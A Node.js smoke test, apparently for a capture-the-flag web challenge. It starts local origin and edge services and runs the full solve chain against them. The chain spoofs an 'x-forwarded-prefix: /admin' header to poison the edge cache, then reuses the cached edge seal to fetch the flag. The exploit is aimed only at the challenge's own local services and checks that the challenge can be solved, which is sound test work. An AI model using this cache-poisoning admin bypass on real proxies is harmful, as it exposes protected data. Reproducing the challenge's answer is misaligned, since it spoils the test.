'use strict';

const { spawn } = require('child_process');
const crypto = require('crypto');

const env = {
  ...process.env,
  EDGE_HOST: '127.0.0.1',
  ORIGIN_BIND: '127.0.0.1',
  ORIGIN_HOST: '127.0.0.1',
  ORIGIN_PORT: '4101',
  EDGE_PORT: '3100',
  TEAM_SECRET: 'smoke-team-secret',
  EDGE_SEAL_SECRET: 'smoke-edge-seal-secret',
  ADMIN_COOKIE: 'smoke-admin-cookie'
};

const origin = spawn(process.execPath, ['--preserve-symlinks-main', 'services/origin.js'], { env, stdio: ['ignore', 'pipe', 'pipe'] });
const edge = spawn(process.execPath, ['--preserve-symlinks-main', 'services/edge.js'], { env, stdio: ['ignore', 'pipe', 'pipe'] });

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function request(path, headers = {}) {
  const response = await fetch(`http://127.0.0.1:${env.EDGE_PORT}${path}`, { headers });
  const text = await response.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    json = null;
  }
  return { response, text, json };
}

function sha256(value) {
  return crypto.createHash('sha256').update(value).digest('hex');
}

async function main() {
  await wait(600);

  const blocked = await request('/admin/api/report');
  if (blocked.response.status !== 403) throw new Error(`expected direct admin block, got ${blocked.response.status}`);

  const poison = await request('/api/report', { 'x-forwarded-prefix': '/admin' });
  if (!poison.json || poison.json.report !== 'admin-risk-export') throw new Error('expected poisoned admin report');
  if (poison.response.headers.get('x-cache') !== 'MISS') throw new Error('expected poison miss');

  const hit = await request('/api/report');
  if (!hit.json || hit.json.report !== 'admin-risk-export') throw new Error('expected cached admin report');
  if (hit.response.headers.get('x-cache') !== 'HIT') throw new Error('expected cache hit');

  const seal = hit.response.headers.get('x-edge-seal');
  if (!seal) throw new Error('expected edge seal on cache hit');

  const bodyHash = sha256(hit.text);
  const vaultUrl = new URL(`http://local${hit.json.vault_path}`);
  vaultUrl.searchParams.set('seal', seal);
  vaultUrl.searchParams.set('body_hash', bodyHash);

  const finalPath = vaultUrl.pathname.replace('/admin', '') + vaultUrl.search;
  const final = await request(finalPath, { 'x-forwarded-prefix': '/admin' });
  if (!final.json || final.json.flag !== env.GZCTF_FLAG) throw new Error(`expected final flag, got ${final.text}`);

  console.log('smoke ok');
}

main()
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  })
  .finally(() => {
    origin.kill('SIGTERM');
    edge.kill('SIGTERM');
  });
